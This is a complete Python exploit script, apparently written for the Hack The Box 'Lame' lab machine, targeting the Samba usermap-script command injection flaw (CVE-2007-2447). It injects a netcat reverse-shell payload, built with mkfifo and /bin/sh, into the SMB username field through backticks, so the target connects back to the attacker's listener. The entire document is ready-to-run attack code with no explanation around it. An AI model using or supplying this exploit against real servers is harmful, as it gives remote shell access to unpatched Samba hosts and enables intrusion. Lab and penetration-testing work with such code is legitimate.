# Hackthebox lame smb exploit
# Date: Nov 12,2022

import sys
from smb.SMBConnection import SMBConnection

def exploit(rhost,rport,lhost,lport):
    payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'
    username = "/=`nohup " + payload + "`"
    
    smb_conn = SMBConnection(username, "", "", "")
    try:
        smb_conn.connect(rhost,rport)
    except:
        print("[+] Payload was sent but something went wrong - check netcat !")


def main():
    print("[*] CVE-2007-2447 - Samba usermap script")
    if len(sys.argv) != 5:
        print("(+)Usage: %s <rhost> <rport> <lhost> <lport> " % sys.argv[0])
    else:
        print("[+] Connecting !")
        rhost = sys.argv[1]
        rport = sys.argv[2]
        lhost = sys.argv[3]
        lport = sys.argv[4]
        exploit(rhost,rport,lhost,lport)

if __name__ == '__main__':
    main()